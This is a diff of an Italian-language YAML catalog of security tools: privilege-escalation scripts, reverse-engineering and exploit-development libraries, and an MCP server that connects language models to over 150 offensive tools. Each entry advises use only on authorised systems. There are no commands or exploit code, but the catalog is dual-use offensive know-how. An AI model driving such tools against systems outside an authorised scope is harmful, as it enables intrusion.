     class=\"rt-blue\">Uso e OPSEC</h4><p>Da usare esclusivamente per validare sistemi
     propri/consentiti. Aggiornare immediatamente le istanze vulnerabili.</p><br><hr>"
   best_in: false
-  category_path: ["03_Post_Exploitation", "Privilege_Escalation", "Linux"]
+  category_path: [ "03_Post_Exploitation", "Privilege_Escalation", "Linux" ]
   notes:
 
 - id: "peass-ng"
   name: "PEASS-ng"
   version: "20250904-27f4363e"
   icon: "../app/icons/github.svg"
-  kind: "toolkit"
-  phases: ["03_Post_Exploitation"]
-  caps: ["winpeas", "linpeas", "macpeas", "privesc-checks"]
+  installation: "GitHub"
   repo: "https://github.com/peass-ng/PEASS-ng"
   desc: "Suite per Privilege Escalation (winPEAS/linPEAS): enum locale con output
     a colori e parser in JSON/HTML."
@@ -3504,16 +2620,14 @@
     class=\"rt-blue\">Uso e OPSEC</h4><p>Eseguire versioni aggiornate dai release
     ufficiali e limitare i check potenzialmente rumorosi.</p><br><hr>"
   best_in: false
-  category_path: ["03_Post_Exploitation", "Privilege_Escalation"]
+  category_path: [ "03_Post_Exploitation", "Privilege_Escalation" ]
   notes:
 
 - id: "ghidra-11-4-2-public"
   name: "Ghidra"
   version: "11.4.2"
   icon: "../app/icons/github.svg"
-  kind: "framework"
-  phases: ["03_Post_Exploitation"]
-  caps: ["disassembly", "decompiler", "scripting"]
+  installation: "GitHub"
   repo: "https://github.com/NationalSecurityAgency/ghidra"
   desc: "Suite SRE di reverse engineering: decompiler, disassembler, analisi bytecode,
     script e headless."
@@ -3526,16 +2640,14 @@
     class=\"rt-blue\">Uso e OPSEC</h4><p>Isolare i sample, usare progetti separati
     e versionare gli script di analisi.</p><br><hr>"
   best_in: false
-  category_path: ["03_Post_Exploitation", "Reverse_Engineering"]
+  category_path: [ "03_Post_Exploitation", "Reverse_Engineering" ]
   notes:
 
 - id: "pwninit-3-3-1"
   name: "pwninit"
   version: "3.3.1"
   icon: "../app/icons/github.svg"
-  kind: "tool"
-  phases: ["03_Post_Exploitation"]
-  caps: ["ctf-bootstrap", "libc-setup", "patch-elf"]
+  installation: "GitHub"
   repo: "https://github.com/io12/pwninit"
   desc: "Bootstrap per CTF/binary‑exploitation: patch ELF, scarica ld/libc, genera
     stub pwntools ‘solve.py’."
@@ -3547,16 +2659,14 @@
     class=\"rt-blue\">Uso e OPSEC</h4><p>Usare in ambienti lab/CTF. Conservare gli
     artefatti originali separati da quelli patchati.</p><br><hr>"
   best_in: false
-  category_path: ["03_Post_Exploitation", "Reverse_Engineering"]
+  category_path: [ "03_Post_Exploitation", "Reverse_Engineering" ]
   notes:
 
 - id: "pwntools-4-14-1"
   name: "pwntools"
   version: "4.14.1"
   icon: "../app/icons/github.svg"
-  kind: "library"
-  phases: ["03_Post_Exploitation"]
-  caps: ["exploit-dev", "rop", "tube-io", "asm"]
+  installation: "GitHub"
   repo: "https://github.com/Gallopsled/pwntools"
   desc: "Libreria per CTF/exploit development in Python: manipola ELF, ROP, networking,
     tubi e processi."
@@ -3568,16 +2678,14 @@
     cyclic, fmtstr, libcdb.</li></ul><br><hr><h4 class=\"rt-blue\">Uso e OPSEC</h4><p>Orientato
     a laboratorio/ricerca; mantenere versioni note per riproducibilità dei write‑up.</p><br><hr>"
   best_in: false
-  category_path: ["03_Post_Exploitation", "Reverse_Engineering"]
+  category_path: [ "03_Post_Exploitation", "Reverse_Engineering" ]
   notes:
 
 - id: "5ire-0-13-2-appimage"
   name: "5ire-0.13.2-x86_64.AppImage"
   version: "0.13.2"
   icon: "../app/icons/github.svg"
-  kind: "app"
-  phases: ["04_Miscellaneous"]
-  caps: ["mcp-client", "rag-local", "providers", "appimage"]
+  installation: "GitHub"
   repo: "https://github.com/nanbingxyz/5ire"
   desc: "Client desktop MCP multiprovider (5ire): assistente AI con integrazione di
     server MCP, KB locale e tool."
@@ -3590,16 +2698,14 @@
     e OPSEC</h4><p>Gestire API key in modo sicuro. Eseguire AppImage in sandbox (es.
     Firejail) quando richiesto dalle policy.</p><br><hr>"
   best_in: false
-  category_path: ["04_Miscellaneous"]
+  category_path: [ "04_Miscellaneous" ]
   notes:
 
 - id: "hexstrike-ai"
   name: "hexstrike-ai"
   version: "6.0"
   icon: "../app/icons/github.svg"
-  kind: "mcp-server"
-  phases: ["04_Miscellaneous"]
-  caps: ["ai-agents", "tool-orchestration", "automation", "pentest-framework"]
+  installation: "GitHub"
   repo: "https://github.com/0x4m4/hexstrike-ai"
   desc: "MCP server che collega LLM a 150+ tool offensivi per automazione di recon,
     scanning, exploit e reporting."
@@ -3613,5 +2719,5 @@
     scope, limiti e approvazioni umane. Monitorare i comandi emessi dagli agenti e
     conservare i log per audit.</p><br><hr>"
   best_in: false
-  category_path: ["04_Miscellaneous"]
+  category_path: [ "04_Miscellaneous" ]
   notes:
